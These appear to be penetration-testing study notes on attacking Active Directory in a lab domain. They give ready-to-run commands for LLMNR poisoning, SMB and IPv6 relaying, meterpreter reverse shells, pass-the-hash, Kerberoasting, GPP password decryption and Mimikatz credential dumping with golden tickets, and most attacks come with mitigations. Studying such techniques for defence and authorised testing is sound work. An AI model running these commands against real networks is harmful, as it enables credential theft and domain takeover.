# Active Directory

1. [Introduction](#introduction)
2. [Attacking Active Directory: Initial Attack Vectors](#attacking-active-directory-initial-attack-vectors)
3. [Attacking Active Directory: Post-Compromise Enumeration](#attacking-active-directory-post-compromise-enumeration)
4. [Attacking Active Directory: Post-Compromise Attacks](#attacking-active-directory-post-compromise-attacks)

## Introduction

* Active Directory (AD) - Directory service developed by Microsoft to manage Windows domain networks; authenticates using Kerberos tickets.

* Physical AD components:

  * Domain Controller - server with AD DS (Active Directory Domain Services) server role installed; hosts a copy of the AD DS directory store and provides authentication & authorization services; admin access.

  * AD DS Data Store - contains database files and processes that store, manage directory info for users, services, apps; consists of Ntds.dit file.

* Logical AD components:

  * AD DS Schema - enforces rules regarding object creation and configuration.

  * Domains - used to group and manage objects in an organization.

  * Trees - hierarchy of domains in AD DS.

  * Forests - collection of domain trees.

  * Organizational Units (OUs) - AD containers that can contain users, groups, containers and other OUs.

  * Trusts - mechanism for users to gain access to resources in another domain; can be directional or transitive.

  * Objects - user, groups, contacts, computers, etc.; everything inside a domain.

## Attacking Active Directory: Initial Attack Vectors

* [This article](https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa) covers some common ways to attack active directory computers and get domain admin.

* LLMNR Poisoning:

  * LLMNR (Link-Local Multicast Name Resolution) is used to identify hosts when DNS fails; previously NBT-NS

  * Flaw is that services utilize username and NTLMv2 hash when aptly responded to.

  * Steps:

    * Run Responder tool in Kali

    ```shell
    ip a
    #note interface

    python Responder.py -I eth0 -rdw
    ```

    * Event occurs in Windows

    * Obtain hashes and crack them using Hashcat

    ```shell
    hashcat -m 5600 ntlmhash.txt rockyou.txt
    #-m 5600 for NTLMv2
    #ntlmhash.txt contains the hashes
    ```

  * Mitigation:

    * Disable LLMNR and NBT-NS

    * Require Network Access Control

    * Use strong password policy

* SMB Relay:

  * Instead of cracking hashes gathered with Responder, we can relay those hashes to specific machines and gain access.

  * Requirements:

    * SMB signing must be disabled on target
    * Relayed user creds must be admin on machine

  * Steps:

    * Discover hosts with SMB signing disabled

    ```shell
    nmap --script=smb2-security-mode.nse -p445 192.168.57.0/24
    #we need to note down machines with 'message signing enabled but not required'

    vim targets.txt
    #add target IPs
    ```

    * Edit Responder config - turn SMB and HTTP off

    ```shell
    vim /etc/responder/Responder.conf
    #turn SMB, HTTP off
    ```

    * Run Responder tool

    ```shell
    python Responder.py -I eth0 -rdw
    ```

    * Setup relay

    ```shell
    python ntlmrelayx.py -tf targets.txt -smb2support

    #trigger connection in Windows machine
    #by pointing it at the attacker machine

    #-i option can be used for an interactive shell
    ```

    * Event occurs in Windows machine

    * Credentials are captured (and saved) and we get access to machine

  * Mitigation:

    * Enable SMB signing on all devices

    * Disable NTLM authentication on network

    * Account tiering

    * Local admin restriction (to prevent lateral movement)

* Gaining Shell Access:

  ```shell
  #this step has to be done once we have the credentials
  msfconsole

  search psexec

  use exploit/windows/smb/psexec

  options
  #set all required options
  #such as RHOSTS, smbdomain, smbpass and smbuser

  set payload windows/x64/meterpreter/reverse_tcp

  set LHOST eth0

  run
  #run exploit
  ```

  ```shell
  #we can use another tool called psexec.py
  psexec.py marvel.local/fcastle:Password1@192.168.57.141

  #try multiple options if these tools do not work
  #such as smbexec and wmiexec
  ```

* IPv6 Attacks (refer [mitm6 attacks](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/) and [NTLM relays](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/) for more info):

  ```shell
  #download and setup the mitm6 tool

  #setup LDAPS as well

  mitm6 -d marvel.local

  #setup relay
  ntlmrelayx.py -6 -t ldaps://192.168.57.140 -wh fakewpad.marvel.local -l lootme
  #generate activity on Windows machine by rebooting it
  #this dumps info in another directory

  ls lootme
  #contains useful info
  #if we keep the program running in background, and the user logins, the creds can be captured
  ```

  * Mitigation:

    * Block DHCPv6 traffic and incoming router advertisements.

    * Disable WPAD via Group Policy.

    * Enable both LDAP signing and LDAP channel binding.

    * Mark Admin users as Protected Users or sensitive accounts.

* [Pass-Back attacks](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack) can be used for printer hacking.

## Attacking Active Directory: Post-Compromise Enumeration

* [PowerView](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993):

  ```ps
  powershell -ep bypass

  . .\PowerView.ps1
  #runs the script, does not show any output

  Get-NetDomain
  #gives info about domain

  Get-NetDomainController
  #info about dc

  Get-DomainPolicy

  (Get-DomainPolicy)."system access"
  #info about particular policy

  Get-NetUser
  #all users

  Get-NetUser | select cn
  #only usernames

  Get-NetUser | select description
  #only description

  Get-UserProperty -Properties pwdlastset
  #view a particular property

  Get-NetComputer
  #list all computers in domain

  Get-NetComputer -FullData

  Get-NetComputer -FullData | select OperatingSystem

  Get-NetGroup -GroupName *admin*
  #view group names having 'admins'

  Invoke-ShareFinder

  Get-NetGPO
  #view all group policies

  Get-NetGPO | select displayname, whenchanged
  ```

* Bloodhound: Recon tool for Active Directory environments.

  ```ps
  powershell -ep bypass

  . .\SharpHound.ps1
  #setup Bloodhound

  Invoke-BloodHound -CollectionMethod All -Domain MARVEL.local -ZipFileName file.zip
  #data collection
  #exports data into zip file
  ```

  * This zip file can be imported in BloodHound. We can use Pre-Built Analytics Queries to plan further.

## Attacking Active Directory: Post-Compromise Attacks

* Pass the Hash:

  ```shell
  crackmapexec smb 192.168.57.0/24 -u fcastle -d MARVEL.local -p Password1
  #sweep entire network
  #attempts to gain access via pass the password
  #can also spray passwords

  crackmapexec smb 192.168.57.0/24 -u fcastle -d MARVEL.local -p Password1 --same
  #attempts to dump SAM files

  psexec.py marvel/fcastle:Password1@192.168.57.142
  #use creds from crackmapexec to gain access to other machine

  secretsdump.py marvel/fcastle:Password1@192.168.57.141
  #silent alternative to hashdump in meterpreter
  #dumps SAM hashes

  #the NTLM hashes can be cracked using Hashcat
  #if we cannot crack hashes, we can pass the hashes (only NTLM, not NTLMv2)

  crackmapexec smb 192.168.57.0/24 -u "Frank Castle" -H <hash> --local-auth
  #attempts to pass the hash

  psexec.py "Frank Castle":@192.168.57.141 -hashes <complete NTLM hash>
  #alt pass the hash method
  ```

  * Mitigations:

    * Limit account reuse

    * Disable Guest and Administrator accounts

    * Use strong passwords

    * Privilege Access Management (PAM)

* Token impersonation:

  * Tokens - temporary keys that allow access without using creds; can be either delegate (login, RDP) or impersonate (drive, script).

  ```shell
  msfconsole

  use exploit/windows/smb/psexec

  set RHOSTS 192.168.57.141

  set smbdomain marvel.local

  set smbpass Password1

  set smbuser fcastle

  set target 2
  #native upload

  options

  set payload windows/x64/meterpreter/reverse_tcp

  set lhost eth0

  run
  #gives meterpreter session

  hashdump

  load incognito
  #metasploit module for token impersonation

  list_tokens -u
  #list tokens by user

  impersonate_token marvel\\administrator
  #two backslashes instead of one for character-escaping

  whoami
  #test if it worked

  rev2self
  #revert to old user
  ```

  * Mitigations:

    * Limit user/group token creation permissions

    * Account tiering

    * Local admin restriction

* Kerberoasting:

  * Goal of [Kerberoasting](https://medium.com/@Shorty420/kerberoasting-9108477279cc) is to get TGS (Ticket Granting Service) and decrypt the server's account hash.

  ```shell
  GetUserSPNs.py marvel.local/fcastle:Password1 -dc-ip 192.168.57.140 -request
  #needs username, password from domain account and its ip
  #this provides us the hash, can be cracked using hashcat

  hashcat -m 13100 hash.txt rockyou.txt
  #cracks the hash
  ```

  * Mitigations:

    * Strong passwords

    * Least privilege (service accounts should not be made domain admins)

* GPP (Group Policy Preferences):

  * [GPP](https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/) allowed admins to create policies using embedded creds (cPassword) which got leaked; patched in MS14-025.

  ```shell
  #after basic enumeration via nmap
  #we get to know that it is domain controller

  smbclient -L \\\\10.10.10.100\\
  #includes SYSVOL

  smbclient -L \\\\10.10.10.100\\Replication
  #accessing an open share
  #find Groups.xml, which includes CPassword

  #in attacker machine
  gpp-decrypt <CPassword>
  #gives password

  #with username and password, we can use Kerberoasting
  GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
  #gives service ticket hash

  hashcat -m 13100 hash.txt rockyou.txt
  #cracks hash

  psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100
  ```

* [URL File Attacks](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share)

* Mimikatz:

  ```shell
  #in victim machine
  mimikatz.exe

  privilege::debug
  
  sekurlsa::logonpasswords
  #dump passwords

  lsadump::sam

  lsadump::lsa /patch
  #dump lsa

  #for golden ticket attacks
  lsadump::lsa /inject /name:krbtgt
  #copy the SID and NTLM from output

  kerberos::golden /User:fakeAdministrator /domain:marvel.local /sid:<SID> /krbtgt:<NTLM hash> /id:500 /ptt
  #to generate golden ticket and use pass-the-ticket

  misc::cmd
  #gets command prompt
  #as Admin
  ```
